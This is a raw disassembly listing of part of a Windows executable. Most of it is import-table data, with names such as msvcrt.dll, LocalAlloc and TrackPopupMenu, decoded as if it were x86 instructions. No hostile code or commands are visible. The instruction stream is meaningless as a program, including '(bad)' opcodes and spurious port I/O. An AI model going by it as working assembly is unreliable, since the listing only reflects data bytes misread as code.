  412741:	xor    BYTE PTR [ecx],al
  412743:	add    BYTE PTR [esi],al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    BYTE PTR [edx],dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    BYTE PTR [ecx+esi*1],ah
  41274e:	add    DWORD PTR [eax],eax
  412750:	cmp    BYTE PTR [ecx],dh
  412752:	add    DWORD PTR [eax],eax
  412754:	dec    edx
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [edx+0x31],bl
  41275a:	add    DWORD PTR [eax],eax
  41275c:	push   0x31
  41275e:	add    DWORD PTR [eax],eax
  412760:	js     0x412793
  412762:	add    DWORD PTR [eax],eax
  412764:	xchg   esi,eax
  412765:	xor    DWORD PTR [ecx],eax
  412767:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	shl    BYTE PTR [ecx],cl
  412772:	add    DWORD PTR [eax],eax
  412774:	in     al,0x31
  412776:	add    DWORD PTR [eax],eax
  412778:	cld    
  412779:	xor    DWORD PTR [ecx],eax
  41277b:	add    BYTE PTR [edx],cl
  41277d:	xor    al,BYTE PTR [ecx]
  41277f:	add    BYTE PTR [eax],al
  412781:	add    BYTE PTR [eax],al
  412783:	add    BYTE PTR [edx+esi*1],ch
  412786:	add    DWORD PTR [eax],eax
  412788:	inc    esp
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    BYTE PTR [esi+0x32],dl
  41278e:	add    DWORD PTR [eax],eax
  412790:	outs   dx,BYTE PTR ds:[esi]
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    BYTE PTR [eax-0x63fffece],al
  412799:	xor    al,BYTE PTR [ecx]
  41279b:	add    BYTE PTR [eax],al
  41279d:	add    BYTE PTR [eax],al
  41279f:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	out    0x32,al
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cli    
  4127ad:	xor    al,BYTE PTR [ecx]
  4127af:	add    BYTE PTR [edx],cl
  4127b1:	xor    eax,DWORD PTR [ecx]
  4127b3:	add    BYTE PTR [eax],ah
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi],dh
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    BYTE PTR [ebx+esi*1+0x1],al
  4127bf:	add    BYTE PTR [eax+0x33],dl
  4127c2:	add    DWORD PTR [eax],eax
  4127c4:	pop    esp
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    BYTE PTR [esi+0x33],ah
  4127ca:	add    DWORD PTR [eax],eax
  4127cc:	je     0x412801
  4127ce:	add    DWORD PTR [eax],eax
  4127d0:	xor    BYTE PTR [ebx],0x1
  4127d3:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4127da:	add    DWORD PTR [eax],eax
  4127dc:	ret    0x133
  4127df:	add    dh,dl
  4127e1:	xor    eax,DWORD PTR [ecx]
  4127e3:	add    dh,ch
  4127e5:	xor    eax,DWORD PTR [ecx]
  4127e7:	add    ah,bh
  4127e9:	xor    eax,DWORD PTR [ecx]
  4127eb:	add    BYTE PTR [esi],dl
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [edx],ch
  4127f1:	xor    al,0x1
  4127f3:	add    BYTE PTR [esp+esi*1],dh
  4127f6:	add    DWORD PTR [eax],eax
  4127f8:	inc    esp
  4127f9:	xor    al,0x1
  4127fb:	add    BYTE PTR [esi+0x34],cl
  4127fe:	add    DWORD PTR [eax],eax
  412800:	pop    edx
  412801:	xor    al,0x1
  412803:	add    BYTE PTR [esi+0x34],ch
  412806:	add    DWORD PTR [eax],eax
  412808:	xchg   BYTE PTR [ecx+eax*1],dh
  41280b:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  412812:	add    DWORD PTR [eax],eax
  412814:	mov    dl,0x34
  412816:	add    DWORD PTR [eax],eax
  412818:	enter  0x134,0x0
  41281c:	fidiv  DWORD PTR [ecx+eax*1]
  41281f:	add    dh,ah
  412821:	xor    al,0x1
  412823:	add    dl,bh
  412825:	xor    al,0x1
  412827:	add    BYTE PTR [esi*1+0x350e0001],al
  41282e:	add    DWORD PTR [eax],eax
  412830:	push   ds
  412831:	xor    eax,0x35360001
  412836:	add    DWORD PTR [eax],eax
  412838:	dec    edx
  412839:	xor    eax,0x355a0001
  41283e:	add    DWORD PTR [eax],eax
  412840:	xor    ax,0x1
  412844:	je     0x41287b
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    dh,BYTE PTR ds:0x359c0001
  41284e:	add    DWORD PTR [eax],eax
  412850:	add    BYTE PTR [eax],al
  412852:	add    BYTE PTR [eax],al
  412854:	mov    edx,0xce000135
  412859:	xor    eax,0x35e00001
  41285e:	add    DWORD PTR [eax],eax
  412860:	in     al,dx
  412861:	xor    eax,0x36040001
  412866:	add    DWORD PTR [eax],eax
  412868:	adc    al,0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	sub    BYTE PTR [esi],dh
  41286e:	add    DWORD PTR [eax],eax
  412870:	ds add DWORD PTR ss:[eax],eax
  412874:	dec    esi
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	pusha  
  412879:	add    DWORD PTR ss:[eax],eax
  41287c:	ins    BYTE PTR es:[edi],dx
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	xor    BYTE PTR [esi],0x1
  412883:	add    BYTE PTR [esi-0x49fffeca],bl
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	retf   0x136
  41288f:	add    dl,bl
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	out    0x36,al
  412896:	add    DWORD PTR [eax],eax
  412898:	(bad)  
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	adc    BYTE PTR [edi],dh
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	and    dh,BYTE PTR [edi]
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	xor    dh,BYTE PTR [edi]
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	inc    esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	push   eax
  4128ad:	aaa    
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	pusha  
  4128b1:	aaa    
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	outs   dx,BYTE PTR ds:[esi]
  4128b5:	aaa    
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	js     0x4128f1
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    BYTE PTR [edi],dh
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	xchg   esi,eax
  4128c1:	aaa    
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	test   al,0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	mov    esi,0xd2000137
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jmp    0x138:0x137
  4128d7:	add    BYTE PTR [esi],cl
  4128d9:	cmp    BYTE PTR [ecx],al
  4128db:	add    BYTE PTR [esi],ah
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1],bh
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	dec    esp
  4128e5:	cmp    BYTE PTR [ecx],al
  4128e7:	add    BYTE PTR [eax+0x38],bl
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	jo     0x412926
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	jle    0x41292a
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	xchg   edx,eax
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [esi-0x51fffec8],bl
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dh,al
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    dl,bl
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    al,ch
  412909:	cmp    BYTE PTR [ecx],al
  41290b:	add    dh,bh
  41290d:	cmp    BYTE PTR [ecx],al
  41290f:	add    BYTE PTR [edx],dl
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [esi],bl
  412915:	cmp    DWORD PTR [ecx],eax
  412917:	add    BYTE PTR [eax],bh
  412919:	cmp    DWORD PTR [ecx],eax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412923:	add    BYTE PTR [edx+0x39],dh
  412926:	add    DWORD PTR [eax],eax
  412928:	add    BYTE PTR [eax],al
  41292a:	add    BYTE PTR [eax],al
  41292c:	xchg   edi,eax
  41292d:	add    ebp,DWORD PTR [ecx+0x73]
  412930:	imul   esp,DWORD PTR fs:[edi+0x69],0x41f0074
  412938:	ja     0x41299d
  41293a:	jae    0x41299f
  41293c:	ins    DWORD PTR es:[edi],dx
  41293d:	jo     0x41293f
  41293f:	add    ch,dh
  412941:	add    BYTE PTR [edi+0x63],bl
  412944:	outs   dx,DWORD PTR ds:[esi]
  412945:	outs   dx,BYTE PTR ds:[esi]
  412946:	je     0x4129ba
  412948:	outs   dx,DWORD PTR ds:[esi]
  412949:	ins    BYTE PTR es:[edi],dx
  41294a:	data16 jo 0x41294d
  41294d:	add    BYTE PTR [ebp+0x74656703],cl
  412953:	outs   dx,BYTE PTR gs:[esi]
  412955:	jbe    0x412957
  412957:	add    BYTE PTR ds:0x73637704,ch
  41295d:	jb     0x4129c2
  41295f:	push   0x3f20072
  412964:	jae    0x4129da
  412966:	jb     0x4129d6
  412968:	arpl   WORD PTR [eax+0x79],si
  41296b:	add    al,ch
  41296d:	add    esi,DWORD PTR [ebx+0x74]
  412970:	jb     0x4129d5
  412972:	jo     0x4129ed
  412974:	add    BYTE PTR [eax],al
  412976:	mov    bl,0x0
  412978:	pop    edi
  412979:	pop    edi
  41297a:	jae    0x4129e1
  41297c:	je     0x4129dd
  41297e:	popa   
  41297f:	jo     0x4129f1
  412981:	pop    edi
  412982:	je     0x4129fd
  412984:	jo     0x4129eb
  412986:	add    BYTE PTR [eax],al
  412988:	lds    eax,FWORD PTR [ebx]
  41298a:	jo     0x4129fe
  41298c:	imul   ebp,DWORD PTR [esi+0x74],0xcc000066
  412993:	add    esi,DWORD PTR [ecx+0x73]
  412996:	outs   dx,DWORD PTR ds:[esi]
  412997:	jb     0x412a0d
  412999:	add    BYTE PTR [edx+0x3],dh
  41299c:	data16 ins BYTE PTR es:[edi],dx
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	outs   dx,DWORD PTR ds:[esi]
  4129a0:	jb     0x4129a2
  4129a2:	lods   al,BYTE PTR ds:[esi]
  4129a3:	add    ebp,DWORD PTR [ecx+0x73]
  4129a6:	js     0x412a0c
  4129a8:	imul   esp,DWORD PTR [edi+0x69],0xa0000074
  4129af:	add    BYTE PTR [edi+0x5f],bl
  4129b2:	jo     0x412a13
  4129b4:	pop    edi
  4129b5:	ins    WORD PTR es:[edi],dx
  4129b7:	outs   dx,DWORD PTR ds:[esi]
  4129b8:	fs add BYTE PTR gs:[eax],al
  4129bc:	xor    eax,0x73637704
  4129c1:	je     0x412a32
  4129c3:	ins    BYTE PTR es:[edi],dx
  4129c4:	add    BYTE PTR [eax],al
  4129c6:	or     al,0x4
  4129c8:	je     0x412a39
  4129ca:	ja     0x412a41
  4129cc:	jo     0x412a3e
  4129ce:	gs jb  0x4129d1
  4129d1:	add    cl,dh
  4129d3:	add    esi,DWORD PTR [ebx+0x74]
  4129d6:	jb     0x412a46
  4129d8:	arpl   WORD PTR [ebp+0x70],bp
  4129db:	add    BYTE PTR [ebx+0x705f5f00],bl
  4129e1:	pop    edi
  4129e2:	pop    edi
  4129e3:	arpl   WORD PTR [edi+0x6d],bp
  4129e6:	ins    DWORD PTR es:[edi],dx
  4129e7:	outs   dx,DWORD PTR ds:[esi]
  4129e8:	fs add BYTE PTR gs:[eax],al
  4129ec:	push   es
  4129ed:	add    al,0x74
  4129ef:	imul   ebp,DWORD PTR [ebp+0x65],0x38b0000
  4129f6:	addr16 gs je 0x412a5d
  4129fa:	add    BYTE PTR [eax],al
  4129fc:	xor    eax,DWORD PTR [edi+esi*2]
  4129ff:	arpl   WORD PTR [ebx+0x74],si
  412a02:	outs   dx,DWORD PTR ds:[esi]
  412a03:	imul   eax,DWORD PTR [eax],0x0
  412a06:	test   eax,0x77736903
  412a0b:	jae    0x412a7d
  412a0d:	popa   
  412a0e:	arpl   WORD PTR [ebp+0x0],sp
  412a11:	add    BYTE PTR [ebx+0x77736903],ch
  412a17:	js     0x412a7d
  412a19:	imul   esp,DWORD PTR [edi+0x69],0xdb0074
  412a20:	pop    edi
  412a21:	popa   
  412a22:	ins    DWORD PTR es:[edi],dx
  412a23:	jae    0x412a8c
  412a25:	pop    edi
  412a26:	gs js  0x412a92
  412a29:	je     0x412a2b
  412a2b:	add    BYTE PTR [ecx],ah
  412a2d:	add    al,0x77
  412a2f:	arpl   WORD PTR [ebx+0x63],si
  412a32:	jo     0x412aad
  412a34:	add    BYTE PTR [eax],al
  412a36:	xchg   BYTE PTR [ecx],al
  412a38:	pop    edi
  412a39:	imul   ebp,DWORD PTR [esi+0x69],0x72657474
  412a40:	ins    DWORD PTR es:[edi],dx
  412a41:	add    BYTE PTR [ebx+eax*1+0x6c617369],dl
  412a48:	outs   dx,BYTE PTR ds:[esi]
  412a49:	jne    0x412ab8
  412a4b:	add    ch,dh
  412a4d:	add    esi,DWORD PTR [ebx+0x74]
  412a50:	jb     0x412ac2
  412a52:	bound  esi,QWORD PTR [edx+0x6b]
  412a55:	add    BYTE PTR [esi+0x73695f01],bl
  412a5b:	ins    DWORD PTR es:[edi],dx
  412a5c:	bound  esp,QWORD PTR [edx+0x6c]
  412a5f:	gs popa 
  412a61:	add    BYTE PTR fs:[eax],al
  412a64:	sbb    BYTE PTR [esi+esi*2],al
  412a67:	jae    0x412ae0
  412a69:	jo     0x412add
  412a6b:	imul   ebp,DWORD PTR [esi+0x74],0x36d0066
  412a72:	data16 addr16 gs je 0x412ada
  412a77:	add    BYTE PTR [edx+0x0],dl
  412a7a:	pop    edi
  412a7b:	pop    eax
  412a7c:	arpl   WORD PTR [eax+0x74],si
  412a7f:	inc    esi
  412a80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4290072
  412a88:	ja     0x412aed
  412a8a:	jae    0x412afa
  412a8c:	arpl   WORD PTR [eax+0x79],si
  412a8f:	add    BYTE PTR [ebx],ah
  412a91:	add    DWORD PTR [edi+0x65],ebx
  412a94:	js     0x412aff
  412a96:	je     0x412a98
  412a98:	imul   eax,DWORD PTR [ebx],0x6f6c6366
  412a9e:	jae    0x412b05
  412aa0:	add    BYTE PTR [eax],al
  412aa2:	call   0x65a489a7
  412aa7:	js     0x412b12
  412aa9:	je     0x412aab
  412aab:	add    bh,al
  412aad:	add    esi,DWORD PTR [eax+0x75]
  412ab0:	je     0x412b15
  412ab2:	add    BYTE PTR [eax],al
  412ab4:	fadd   DWORD PTR [ebx]
  412ab6:	jae    0x412b1d
  412ab8:	je     0x412b26
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	arpl   WORD PTR [ecx+0x6c],sp
  412abe:	add    BYTE PTR gs:[ebp+0x735f5f00],dh
  412ac5:	gs je  0x412b3d
  412ac8:	jae    0x412b2f
  412aca:	jb     0x412b39
  412acc:	popa   
  412acd:	je     0x412b37
  412acf:	gs jb  0x412b44
  412ad2:	add    BYTE PTR [eax],al
  412ad4:	mov    BYTE PTR [ebx],al
  412ad6:	data16 ja 0x412b4b
  412ad9:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x7003c300
  412ae1:	gs jb  0x412b56
  412ae4:	outs   dx,DWORD PTR ds:[esi]
  412ae5:	jb     0x412ae7
  412ae7:	add    BYTE PTR [edx+0x3],bl
  412aea:	popa   
  412aeb:	je     0x412b5c
  412aed:	ins    BYTE PTR es:[edi],dx
  412aee:	add    BYTE PTR [eax],al
  412af0:	jb     0x412af2
  412af2:	pop    edi
  412af3:	pop    edi
  412af4:	addr16 gs je 0x412b65
  412af8:	popa   
  412af9:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b00:	sub    BYTE PTR [edi+esi*2],al
  412b03:	arpl   WORD PTR [ebx+0x6e],si
  412b06:	arpl   WORD PTR [ebp+0x70],bp
  412b09:	add    dl,dl
  412b0b:	add    esi,DWORD PTR [edx+0x65]
  412b0e:	ins    DWORD PTR es:[edi],dx
  412b0f:	outs   dx,DWORD PTR ds:[esi]
  412b10:	jbe    0x412b77
  412b12:	add    BYTE PTR [eax],al
  412b14:	dec    ebp
  412b15:	push   ebx
  412b16:	push   esi
  412b17:	inc    ebx
  412b18:	push   edx
  412b19:	push   esp
  412b1a:	cs fs ins BYTE PTR es:[edi],dx
  412b1d:	ins    BYTE PTR es:[edi],dx
  412b1e:	add    BYTE PTR [eax],al
  412b20:	mov    edi,0x636f4c01
  412b25:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412b29:	outs   dx,DWORD PTR fs:[esi]
  412b2b:	ja     0x412b82
  412b2d:	jo     0x412b93
  412b2f:	popa   
  412b30:	je     0x412b97
  412b32:	add    BYTE PTR [eax],al
  412b34:	nop
  412b35:	add    dl,BYTE PTR [edx+esi*2+0x61]
  412b39:	arpl   WORD PTR [ebx+0x50],bp
  412b3c:	outs   dx,DWORD PTR ds:[esi]
  412b3d:	jo     0x412bb4
  412b3f:	jo     0x412b8e
  412b41:	outs   dx,BYTE PTR gs:[esi]
  412b43:	jne    0x412b45
  412b45:	add    BYTE PTR [eax],bh
  412b47:	add    dl,BYTE PTR [ebx+0x65]
  412b4a:	je     0x412b8f
  412b4c:	jne    0x412bc0
  412b4e:	jae    0x412bbf
  412b50:	jb     0x412b52
  412b52:	mov    eax,ds:0x57734901
  412b57:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412b5e:	popa   
  412b5f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412b63:	add    BYTE PTR [ecx+0x536e4901],al
  412b69:	outs   dx,BYTE PTR gs:[esi]
  412b6b:	fs dec ebp
  412b6d:	gs jae 0x412be3
  412b70:	popa   
  412b71:	addr16 gs inc ebp
  412b74:	js     0x412b76
  412b76:	xchg   ebx,eax
  412b77:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412b7b:	je     0x412bef
  412b7d:	outs   dx,DWORD PTR ds:[esi]
  412b7e:	jns    0x412bc1
  412b80:	arpl   WORD PTR [ebx+0x65],sp
  412b83:	ins    BYTE PTR es:[edi],dx
  412b84:	gs jb  0x412be8
  412b87:	je     0x412bf8
  412b89:	jb     0x412bdf
  412b8b:	popa   
  412b8c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b90:	adc    eax,DWORD PTR [ecx]
  412b92:	inc    edi
  412b93:	gs je  0x412bda
  412b96:	outs   dx,DWORD PTR ds:[esi]
  412b97:	jne    0x412bfb
  412b99:	ins    BYTE PTR es:[edi],dx
  412b9a:	gs inc ebx
  412b9c:	ins    BYTE PTR es:[edi],dx
  412b9d:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412ba4:	add    BYTE PTR [eax],al
  412ba6:	mov    ds:0x57734901,eax
  412bab:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  412bb2:	jae    0x412c1d
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	mov    al,0x1
  412bba:	dec    esp
  412bbb:	outs   dx,DWORD PTR ds:[esi]
  412bbc:	popa   
  412bbd:	fs dec ecx
  412bbf:	arpl   WORD PTR [edi+0x6e],bp
  412bc2:	push   edi
  412bc3:	add    BYTE PTR [ebp+0x79656b02],bh
  412bc9:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  412bcd:	jbe    0x412c34
  412bcf:	outs   dx,BYTE PTR ds:[esi]
  412bd0:	je     0x412bd2
  412bd2:	test   eax,0x616f4c01
  412bd7:	fs inc edx
  412bd9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x58004170
  412be1:	add    dl,BYTE PTR [ebx+0x65]
  412be4:	je     0x412c38
  412be6:	arpl   WORD PTR gs:[eax+eax*1-0x1e],si
  412beb:	add    BYTE PTR [esi+0x69],al
  412bee:	outs   dx,BYTE PTR ds:[esi]
  412bef:	fs push edi
  412bf1:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412bf8:	inc    ecx
  412bf9:	add    cl,bh
  412bfb:	add    BYTE PTR [edi+0x65],al
  412bfe:	je     0x412c43
  412c00:	ins    BYTE PTR es:[edi],dx
  412c01:	popa   
  412c02:	jae    0x412c77
  412c04:	dec    esp
  412c05:	outs   dx,DWORD PTR ds:[esi]
  412c06:	outs   dx,BYTE PTR ds:[esi]
  412c07:	addr16 push edi
  412c09:	add    BYTE PTR ds:0x6e655302,ah
  412c0f:	fs dec ecx
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	jo     0x412c89
  412c14:	je     0x412c16
  412c16:	cdq    
  412c17:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412c1b:	ins    BYTE PTR es:[edi],dx
  412c1c:	outs   dx,DWORD PTR ds:[esi]
  412c1d:	addr16 inc edx
  412c1f:	outs   dx,DWORD PTR ds:[esi]
  412c20:	js     0x412c6b
  412c22:	outs   dx,BYTE PTR ds:[esi]
  412c23:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	inc    ecx
  412c2f:	add    BYTE PTR [edi+0x70737702],bh
  412c35:	jb     0x412ca0
  412c37:	outs   dx,BYTE PTR ds:[esi]
  412c38:	je     0x412ca0
  412c3a:	inc    ecx
  412c3b:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  412c42:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x654700f8
  412c4a:	je     0x412c8f
  412c4c:	ins    BYTE PTR es:[edi],dx
  412c4d:	popa   
  412c4e:	jae    0x412cc3
  412c50:	dec    esp
  412c51:	outs   dx,DWORD PTR ds:[esi]
  412c52:	outs   dx,BYTE PTR ds:[esi]
  412c53:	addr16 inc ecx
  412c55:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  412c5c:	outs   dx,DWORD PTR ds:[esi]
  412c5d:	outs   dx,BYTE PTR ds:[esi]
  412c5e:	imul   esp,DWORD PTR [ebx+0x0],0x47014200
  412c65:	gs je  0x412cb6
  412c68:	gs js  0x412cdf
  412c6b:	inc    esp
  412c6c:	ins    BYTE PTR es:[edi],dx
  412c6d:	addr16 inc edi
  412c6f:	jb     0x412ce0
  412c71:	jne    0x412ce3
  412c73:	dec    ecx
  412c74:	je     0x412cdb
  412c76:	ins    DWORD PTR es:[edi],dx
  412c77:	add    BYTE PTR [ebx+0x61724400],dh
  412c7d:	ja     0x412cc8
  412c7f:	arpl   WORD PTR [edi+0x6e],bp
  412c82:	add    BYTE PTR [eax],al
  412c84:	jmp    0x65b17b8a
  412c89:	outs   dx,BYTE PTR ds:[esi]
  412c8a:	dec    ecx
  412c8b:	outs   dx,BYTE PTR ds:[esi]
  412c8c:	jo     0x412d03
  412c8e:	je     0x412cd4
  412c90:	gs jae 0x412cfe
  412c93:	je     0x412d04
  412c95:	jo     0x412c97
  412c97:	add    dh,bh
  412c99:	add    BYTE PTR [edi+0x65],al
  412c9c:	je     0x412ce1
  412c9e:	ins    BYTE PTR es:[edi],dx
  412c9f:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412ca6:	jb     0x412ca8
  412ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca9:	add    DWORD PTR [ecx+0x73],ecx
  412cac:	pop    edx
  412cad:	outs   dx,DWORD PTR ds:[esi]
  412cae:	outs   dx,DWORD PTR ds:[esi]
  412caf:	ins    DWORD PTR es:[edi],dx
  412cb0:	gs add BYTE PTR fs:[eax],al
  412cb4:	rol    DWORD PTR [eax],0x45
  412cb7:	outs   dx,BYTE PTR ds:[esi]
  412cb8:	popa   
  412cb9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cbd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412cc4:	sub    BYTE PTR [eax],al
  412cc6:	inc    ebx
  412cc7:	push   0x6f4c7261
  412ccc:	ja     0x412d33
  412cce:	jb     0x412d12
  412cd0:	jne    0x412d38
  412cd2:	push   di
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	inc    ebx
  412cd7:	add    BYTE PTR [ebx+0x6c],al
  412cda:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  412ce1:	arpl   WORD PTR [edx+0x65],si
  412ce4:	outs   dx,BYTE PTR gs:[esi]
  412ce6:	add    BYTE PTR [eax],al
  412ce8:	add    eax,DWORD PTR [eax]
  412cea:	inc    ecx
  412ceb:	fs push 0x75
  412cee:	jae    0x412d64
  412cf0:	push   edi
  412cf1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412cf8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412cfc:	add    BYTE PTR [eax],al
  412cfe:	icebp  
  412cff:	add    DWORD PTR [eax+0x6f],edx
  412d02:	jae    0x412d78
  412d04:	dec    ebp
  412d05:	gs jae 0x412d7b
  412d08:	popa   
  412d09:	addr16 gs inc ecx
  412d0c:	add    BYTE PTR [eax],al
  412d0e:	out    dx,al
  412d0f:	add    DWORD PTR [eax+0x65],edx
  412d12:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412d17:	jae    0x412d7a
  412d19:	addr16 gs inc ecx
  412d1c:	add    BYTE PTR [eax],al
  412d1e:	dec    ebx
  412d1f:	add    DWORD PTR [edi+0x65],eax
  412d22:	je     0x412d74
  412d24:	jb     0x412d95
  412d26:	jo     0x412d7f
  412d28:	add    BYTE PTR [eax],al
  412d2a:	inc    esi
  412d2b:	add    BYTE PTR [ebx+0x6c],al
  412d2e:	outs   dx,DWORD PTR ds:[esi]
  412d2f:	jae    0x412d96
  412d31:	inc    esp
  412d32:	gs jae 0x412da0
  412d35:	je     0x412da6
  412d37:	jo     0x412d39
  412d39:	add    cl,cl
  412d3b:	add    DWORD PTR [ebp+0x61],ecx
  412d3e:	jo     0x412d97
  412d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412d47:	imul   ebp,DWORD PTR [esi+0x74],0x2020073
  412d4e:	push   edx
  412d4f:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  412d58:	popa   
  412d59:	jae    0x412dce
  412d5b:	inc    ecx
  412d5c:	add    BYTE PTR [eax],al
  412d5e:	mov    es,WORD PTR [ecx]
  412d60:	dec    ecx
  412d61:	jae    0x412da6
  412d63:	push   0x6c417261
  412d68:	jo     0x412dd2
  412d6a:	popa   
  412d6b:	dec    esi
  412d6c:	jne    0x412ddb
  412d6e:	gs jb  0x412dda
  412d71:	arpl   WORD PTR [edi+0x0],dx
  412d74:	mov    cl,0x1
  412d76:	dec    esp
  412d77:	outs   dx,DWORD PTR ds:[esi]
  412d78:	popa   
  412d79:	fs dec ecx
  412d7b:	ins    DWORD PTR es:[edi],dx
  412d7c:	popa   
  412d7d:	addr16 gs inc ecx
  412d80:	add    BYTE PTR [eax],al
  412d82:	sahf   
  412d83:	add    DWORD PTR [ecx+0x73],ecx
  412d86:	push   edx
  412d87:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412d8c:	jo     0x412e02
  412d8e:	jns    0x412d90
  412d90:	mov    es,WORD PTR [edx]
  412d92:	push   esp
  412d93:	outs   dx,DWORD PTR ds:[esi]
  412d94:	push   ebp
  412d95:	outs   dx,BYTE PTR ds:[esi]
  412d96:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412d9d:	add    BYTE PTR [ebx],bh
  412d9f:	add    DWORD PTR [edi+0x65],eax
  412da2:	je     0x412df1
  412da4:	gs jae 0x412e1a
  412da7:	popa   
  412da8:	addr16 gs inc ebp
  412dab:	js     0x412e21
  412dad:	jb     0x412e10
  412daf:	dec    ecx
  412db0:	outs   dx,BYTE PTR ds:[esi]
  412db1:	outs   dx,WORD PTR ds:[esi]
  412db3:	add    BYTE PTR [ebp+0x1],al
  412db6:	inc    edi
  412db7:	gs je  0x412e0a
  412dba:	popa   
  412dbb:	jb     0x412e22
  412dbd:	outs   dx,BYTE PTR ds:[esi]
  412dbe:	je     0x412dc0
  412dc0:	bound  eax,QWORD PTR [eax]
  412dc2:	inc    ebx
  412dc3:	jb     0x412e2a
  412dc5:	popa   
  412dc6:	je     0x412e2d
  412dc8:	push   edi
  412dc9:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412dd0:	inc    ecx
  412dd1:	add    BYTE PTR [ecx+0x766e4901],cl
  412dd7:	popa   
  412dd8:	ins    BYTE PTR es:[edi],dx
  412dd9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412de1:	je     0x412de3
  412de3:	add    BYTE PTR [ebp+0x2],ch
  412de6:	push   ebx
  412de7:	gs je  0x412e41
  412dea:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412df1:	outs   dx,BYTE PTR ds:[esi]
  412df2:	addr16 inc ecx
  412df4:	add    BYTE PTR [eax],al
  412df6:	adc    eax,0x6c655202
  412dfb:	gs popa 
  412dfd:	jae    0x412e64
  412dff:	inc    esp
  412e00:	inc    ebx
  412e01:	add    BYTE PTR [eax+eax*1],ah
  412e04:	inc    ebx
  412e05:	push   0x65676e61
  412e0a:	dec    ebp
  412e0b:	outs   dx,BYTE PTR gs:[esi]
